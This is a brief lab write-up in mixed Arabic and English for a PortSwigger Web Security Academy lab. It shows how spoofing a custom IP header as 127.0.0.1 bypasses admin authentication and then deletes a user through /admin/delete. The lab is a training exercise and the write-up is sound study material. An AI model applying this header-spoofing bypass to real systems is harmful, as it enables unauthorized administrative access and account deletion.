# Lab : Authentication bypass via information disclosure

https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

- الفكره من الLab ده ان في information disclosure ان صفحه الadmin مفتوحه بس هي عايزه bypass لل  authentication  وده عن طريق الhttp header بbypass في الfront end ملحوظه الbypass عن طريق ان الموقع لو الطلب جاي من الserver فا هو trust عادي يعني بس ساعتها الserver  بيلبس في الحيط

```bash
1. X-Custom-Ip-Authorization: 127.0.0.1

2. /admin

3. /admin/delete?username=carlos
```
